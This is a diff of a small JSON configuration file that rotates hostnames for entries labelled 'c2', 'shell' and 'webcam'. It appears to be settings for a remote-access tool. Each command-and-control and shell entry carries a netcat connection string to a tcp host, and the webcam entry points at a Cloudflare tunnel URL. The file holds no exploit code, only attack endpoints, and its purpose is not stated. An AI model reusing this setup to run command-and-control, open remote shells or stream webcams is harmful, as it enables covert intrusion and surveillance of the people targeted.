@@ -1,18 +1,18 @@
 {
   "c2": {
-    "host": "tuesday-philadelphia-rp-vocal",
+    "host": "strange-griffin-thinkpad-somerset",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc tuesday-philadelphia-rp-vocal:"
+    "connection_string": "nc strange-griffin-thinkpad-somerset:"
   },
   "shell": {
-    "host": "scan-edges-nano-accompanying",
+    "host": "forecast-blocked-carolina-hydrocodone",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc scan-edges-nano-accompanying:"
+    "connection_string": "nc forecast-blocked-carolina-hydrocodone:"
   },
   "webcam": {
-    "url": "https://folks-liable-gifts-assumptions.trycloudflare.com",
+    "url": "https://ecommerce-immediate-casting-kept.trycloudflare.com",
     "type": "http"
   }
 }
